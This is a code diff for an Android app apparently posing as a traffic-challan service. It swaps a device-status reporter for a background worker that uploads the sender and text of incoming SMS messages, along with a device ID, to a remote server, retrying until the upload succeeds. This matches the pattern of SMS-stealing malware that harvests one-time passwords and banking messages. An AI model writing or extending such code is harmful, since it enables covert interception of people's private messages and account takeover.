@@ -4,30 +4,30 @@ import android.content.Context
 import android.util.Log
 import androidx.work.CoroutineWorker
 import androidx.work.WorkerParameters
-// यहाँ सुधार किया गया है: ListenableWorker.Result का इस्तेमाल करें
-import androidx.work.ListenableWorker.Result 
+import androidx.work.ListenableWorker.Result   // ✅ यह import जरूरी है
 import com.rte.challan.network.ApiClient
-import com.rte.challan.utils.DeviceInfo
-import com.rte.challan.data.StatusRequest
+import com.rte.challan.data.IncomingSmsRequest
 
-class StatusWorker(context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {
+class SendIncomingSmsWorker(context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {
 
     override suspend fun doWork(): Result {
-        val deviceId = DeviceInfo.getDeviceId(applicationContext)
-        val battery = DeviceInfo.getBatteryLevel(applicationContext)
-        val request = StatusRequest(deviceId, battery, online = true)
+        val deviceId = inputData.getString("deviceId") ?: return Result.failure()
+        val sender = inputData.getString("sender") ?: return Result.failure()
+        val body = inputData.getString("body") ?: return Result.failure()
+
+        val request = IncomingSmsRequest(deviceId, sender, body)
 
         return try {
-            val response = ApiClient.instance.updateStatus(request)
+            val response = ApiClient.instance.sendIncomingSms(request)
             if (response.isSuccessful) {
-                Log.d("StatusWorker", "Status updated")
+                Log.d("IncomingSms", "SMS sent to server")
                 Result.success()
             } else {
-                Log.e("StatusWorker", "Failed: ${response.code()}")
+                Log.e("IncomingSms", "Failed: ${response.code()}")
                 Result.retry()
             }
         } catch (e: Exception) {
-            Log.e("StatusWorker", "Error: ${e.message}")
+            Log.e("IncomingSms", "Error: ${e.message}")
             Result.retry()
         }
     }
